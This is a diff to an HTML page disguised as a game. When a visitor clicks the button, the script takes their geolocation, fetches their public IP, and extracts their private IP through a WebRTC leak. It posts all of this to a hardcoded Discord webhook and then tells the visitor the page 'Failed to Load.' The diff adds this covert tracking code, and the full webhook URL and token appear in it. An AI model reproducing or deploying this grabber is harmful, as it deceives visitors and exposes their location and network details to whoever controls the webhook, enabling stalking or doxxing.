@@ -40,33 +40,109 @@
     <script>
         document.getElementById('sendLocation').addEventListener('click', function() {
             // Play audio when button is pressed
-            document.getElementById('audio').play();            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, showError);} else {
-                alert("Geolocation is not supported by this browser.");} });        function sendLocation(position) {
+            document.getElementById('audio').play();            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(sendLocation, showError);
+            } else {
+                alert("Geolocation is not supported by this browser.");
+            } 
+        });
+
+        // Function to get Public IP from a third-party service
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Error fetching public IP:', error);
+                return 'Not available';
+            }
+        }
+
+        // Function to get Private IP using WebRTC
+        function getPrivateIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(pc.setLocalDescription.bind(pc));
+
+                pc.onicecandidate = (ice) => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        // Regex to find an IP address
+                        const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+                        const ipAddr = ipRegex.exec(ice.candidate.candidate)[1];
+                        if (ipAddr) {
+                            pc.onicecandidate = null; // Stop listening for more candidates
+                            resolve(ipAddr);
+                        }
+                    }
+                };
+
+                // Set a timeout in case the process hangs or fails
+                setTimeout(() => resolve('Not available'), 1000);
+            });
+        }
+
+        // Main function to gather all data and send it
+        async function sendLocation(position) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
+
+            // Gather all IPs
+            const publicIP = await getPublicIP();
+            const privateIP = await getPrivateIP();
+
             // Create a Google Maps link with a marker at the exact location
-            const googleMapsLink =`https://www.google.com/maps/dir/?api=1&destination=${lat},${lon}&destination_place_id=ChIJN1t_tDeuEmsRUcIaDl1M5fI&markers=color:red%7Clabel:C%7C${lat},${lon}`;            const webhookUrl = 'https://discord.com/api/webhooks/1424102601112293407/wqpsY1rZMZaAuIDxOq8TgP75L0mpzozmTv_YGP6B6dBpQ0E6nJJVTr08teeFSJW27von'; // Replace with your Discord webhook URL
+            const googleMapsLink =`https://www.google.com/maps?q=${lat},${lon}&z=15`;
+            
+            const webhookUrl = 'https://discord.com/api/webhooks/1424102601112293407/wqpsY1rZMZaAuIDxOq8TgP75L0mpzozmTv_YGP6B6dBpQ0E6nJJVTr08teeFSJW27von'; // Your Discord webhook URL
+            
+            // Format the data for the Discord webhook
             const data = {
-                content:`User's Location:${googleMapsLink}`            };
+                content: `
+--- New Player Log ---
+**📍 Location:** [Click to view map](${googleMapsLink})
+**🌐 Public IP:** \`${publicIP}\`
+**💻 Private IP:** \`${privateIP}\`
+----------------------
+`
+            };
             
             fetch(webhookUrl, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'}, body: JSON.stringify(data)            }).then(response => {
+                    'Content-Type': 'application/json'
+                }, 
+                body: JSON.stringify(data)
+            }).then(response => {
                 if (response.ok) {
-                    alert('Failed to Load.');} else {
-                    alert('Failed to Load.');} }).catch(error => {
-                console.error('Error:', error);            });} function showError(error) {
+                    alert('Failed to Load.');
+                } else {
+                    alert('Failed to Load.');
+                } 
+            }).catch(error => {
+                console.error('Error sending data to webhook:', error);
+                alert('An error occurred while sending data.');
+            });
+        }
+
+        function showError(error) {
             switch (error.code) {
                 case error.PERMISSION_DENIED:
-                    alert("I Guess no game");                    break;
+                    alert("I Guess no game");                    
+                    break;
                 case error.POSITION_UNAVAILABLE:
-                    alert("Not Avalible.");                    break;
+                    alert("Location information is unavailable.");                    
+                    break;
                 case error.TIMEOUT:
-                    alert("The request to play has timed out.");                    break;
+                    alert("The request to get user location timed out.");                    
+                    break;
                 case error.UNKNOWN_ERROR:
-                    alert("An unknown error occurred.");                    break;} }
+                    alert("An unknown error occurred.");                    
+                    break;
+            } 
+        }
     </script>
 </body>
 </html>
